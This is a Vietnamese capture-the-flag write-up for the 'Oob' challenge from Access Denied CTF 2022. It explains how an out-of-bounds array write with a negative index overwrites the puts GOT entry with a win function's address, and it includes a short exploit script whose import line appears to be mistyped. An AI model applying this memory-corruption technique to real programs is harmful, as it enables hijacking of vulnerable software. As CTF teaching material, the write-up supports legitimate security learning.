# [Access Denied CTF 2022] Oob
<p>Chương trình yêu cầu nhập index và sau đó là giá trị để gán vào arr[index]. Vì người dùng có thể nhập index tùy ý, nên có thể ghi ra ngoài phạm vi mảng -> dẫn đến lỗi Out-of-Bounds.</p>

![alt text](/thanhlai/post/pwnable/image/post3/image.png)

<p>Quan sát bảng Functions, ta có hàm win trả về nội dung flag -> Mục tiêu: trỏ đến hàm win.</p>

![alt text](/thanhlai/post/pwnable/image/post3/image-3.png)

<p>Mảng arr bắt đầu tại địa chỉ 0x404080 trong vùng .bss.</p>

![alt text](/thanhlai/post/pwnable/image/post3/image-1.png)

<p>Hàm puts được gọi ngay sau thao tác ghi vào mảng. Vì địa chỉ GOT của puts là 0x404018, nằm trước mảng arr, nên ta có thể lợi dụng lỗi Out-of-Bounds để ghi đè địa chỉ thực sự của hàm puts này thành địa chỉ của hàm win.</p>

![alt text](/thanhlai/post/pwnable/image/post3/image-6.png)


<p>Có thể tính được index để đến địa chỉ GOT của hàm puts bằng:  - (địa chỉ arr - địa chỉ GOT của puts) chia cho 4. Vì kiểu của các phần tử là int nên kích thước là 4 byte nên chia cho 4. Còn lấy giá trị âm bởi vì địa chỉ địa chỉ GOT của puts nằm trước nên index sẽ có index là âm. Script exploit:</p>

```
from pwnable import *

p = process('./oob')
elf = ELF('./oob')

offset = - (elf.sym['arr'] - elf.got['puts']) // 4  
win_addr = elf.sym['win']

p.sendlineafter(b'Enter the index: ', str(offset).encode())
p.sendlineafter(b'Enter the value: ', str(win_addr).encode())

p.interactive()
```

<p>Chạy script và lấy được flag thành công.</p>

![alt text](/thanhlai/post/pwnable/image/post3/image-4.png)

<p>Sau khi thực hiện script, chương trình gọi puts, nhưng do địa chỉ thực sự của puts đã bị ghi đè thành win, nên thực chất chương trình nhảy vào hàm win và in ra flag.</p>

![alt text](/thanhlai/post/pwnable/image/post3/image-5.png)